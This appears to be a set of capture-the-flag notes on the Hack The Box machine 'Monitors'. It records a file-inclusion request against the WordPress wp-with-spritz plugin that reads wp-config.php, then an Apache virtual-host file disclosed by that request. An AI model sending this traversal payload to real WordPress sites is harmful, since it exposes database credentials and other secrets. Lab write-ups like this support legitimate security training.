# WordPress

## Plugins

http://monitors.htb/wp-content/plugins/wp-with-spritz/

![[Pasted image 20210606161704.png]]


## Remote File Inclusion

https://www.exploit-db.com/exploits/44544


GET /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php

![[Pasted image 20210606161803.png]]

## VHost disclosure

![[Pasted image 20210606181044.png]]

/etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf

```html
HTTP/1.1 200 OK
Date: Sun, 06 Jun 2021 17:09:26 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1401
Connection: close
Content-Type: text/html; charset=UTF-8

<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin admin@monitors.htb
	ServerName cacti-admin.monitors.htb
	DocumentRoot /usr/share/cacti
	ServerAlias cacti-admin.monitors.htb

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog /var/log/cacti-error.log
	CustomLog /var/log/cacti-access.log common

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```